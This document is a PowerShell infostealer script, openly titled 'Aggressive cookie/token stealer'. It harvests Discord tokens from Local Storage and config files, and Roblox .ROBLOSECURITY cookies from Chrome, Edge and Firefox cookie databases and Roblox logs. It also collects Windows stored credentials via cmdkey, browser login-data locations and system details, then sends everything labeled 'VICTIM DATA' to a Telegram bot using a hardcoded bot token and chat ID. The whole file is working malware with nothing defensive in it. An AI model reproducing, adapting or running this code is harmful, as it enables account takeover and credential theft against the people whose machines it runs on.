# stealer.ps1 — Aggressive cookie/token stealer
# Uses binary-safe file reading for .ldb, Cookies, .sqlite databases
# Sends everything to Telegram

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$logFile = "$env:TEMP\stealer_debug.log"
function Write-Log { param([string]$Msg); "$((Get-Date -f 'yyyy-MM-dd HH:mm:ss')) - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8 }
function Send-Telegram { param([string]$Message); try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text=$Message;parse_mode="HTML"} -ErrorAction Stop | Out-Null } catch { try { $body="chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("Content-Type","application/x-www-form-urlencoded"); $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage",$body) | Out-Null } catch {} } }

$report = "<b>[+] VICTIM DATA</b>`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')`n"
$discordTokens = @()
$robloxTokens = @()

# === DISCORD: binary-safe ===
Write-Log "[Discord] Scanning..."
$discordPaths = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb")
foreach ($basePath in $discordPaths) {
    if (-not (Test-Path $basePath)) { continue }
    Get-ChildItem -Path "$basePath\Local Storage" -Recurse -ErrorAction SilentlyContinue | where { -not $_.PSIsContainer } | foreach {
        try {
            $ext = $_.Extension.ToLower()
            if ($ext -in @(".ldb",".log",".json")) {
                $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                $text = [System.Text.Encoding]::UTF8.GetString($bytes, 0, [math]::Min($bytes.Length, 5MB))
                [regex]::Matches($text, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}') | foreach { $discordTokens += $_.Value }
                if ($text -match "discord\.com") { $report += "`n<b>DISCORD_COOKIE_DB:</b> $($_.FullName)" }
            }
        } catch {}
    }
    # config.json
    if (Test-Path "$basePath\config.json") {
        try { [regex]::Matches((Get-Content "$basePath\config.json" -Raw -ErrorAction SilentlyContinue), '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}') | foreach { $discordTokens += $_.Value } } catch {}
    }
}
if ($discordTokens) { $report += "`n<b>DISCORD_TOKENS ($($discordTokens.Count)):</b>`n"; $discordTokens | Sort-Object -Unique | foreach { $report += "<code>$_</code>`n" } } else { $report += "`n<b>DISCORD:</b> No tokens`n" }

# === ROBLOX: binary-safe ===
Write-Log "[Roblox] Scanning..."
$cookieDBs = @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies","$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Cookies")
foreach ($db in $cookieDBs) {
    if (Test-Path $db) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($db)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes, 0, [math]::Min($bytes.Length, 10MB))
            if ($text -match "roblox\.com") { $report += "`n<b>ROBLOX_COOKIE_DB:</b> $db" }
            if ($text -match "ROBLOSECURITY") { [regex]::Matches($text, 'ROBLOSECURITY\|[^|]*\|[^|]*\|([a-zA-Z0-9_-]{80,})') | foreach { $robloxTokens += $_.Groups[1].Value } }
        } catch {}
    }
}
# Firefox
Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\cookies.sqlite" -ErrorAction SilentlyContinue | foreach {
    try { $bytes = [System.IO.File]::ReadAllBytes($_.FullName); $text = [System.Text.Encoding]::UTF8.GetString($bytes, 0, [math]::Min($bytes.Length, 10MB)); if ($text -match "ROBLOSECURITY") { [regex]::Matches($text, 'ROBLOSECURITY\|[^|]*\|[^|]*\|([a-zA-Z0-9_-]{80,})') | foreach { $robloxTokens += $_.Groups[1].Value } } } catch {}
}
# Roblox logs
Get-ChildItem "$env:LOCALAPPDATA\Roblox\Versions\*\output.log" -Recurse -ErrorAction SilentlyContinue | foreach {
    try { $bytes = [System.IO.File]::ReadAllBytes($_.FullName); $text = [System.Text.Encoding]::UTF8.GetString($bytes, 0, [math]::Min($bytes.Length, 1MB)); [regex]::Matches($text, '[A-Za-z0-9_-]{40,}') | foreach { $robloxTokens += $_.Value } } catch {}
}
if ($robloxTokens) { $report += "`n<b>ROBLOX_TOKENS ($($robloxTokens.Count)):</b>`n"; $robloxTokens | Sort-Object -Unique | foreach { $report += "<code>$_</code>`n" } } else { $report += "`n<b>ROBLOX:</b> No tokens`n" }

# === SYSTEM ===
try { $os=(Get-CimInstance Win32_OperatingSystem).Caption; $cpu=(Get-CimInstance Win32_Processor).Name; $ram=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2); $report += "`n<b>SYSTEM:</b>`nOS: $os`nCPU: $cpu`nRAM: $ram GB`n" } catch {}
# === CREDS ===
try {$creds=cmd /c cmdkey /list 2>$null; if($creds){$report+="`n<b>[CREDS]</b>`n$creds`n"} } catch {}
# === BROWSER PASSWORDS ===
$loginData="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if(-not(Test-Path$loginData)){$loginData="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
if(Test-Path$loginData){$report+="`n<b>[BROWSER_PASSWORDS]</b>`nLogin Data: $loginData`n"}

# Send
Send-Telegram -Message $report
Send-Telegram -Message "[+] PAYLOAD EXECUTED on $env:COMPUTERNAME at $(Get-Date -f yyyy-MM-dd HH:mm:ss)"
Write-Log "Done. Report sent."
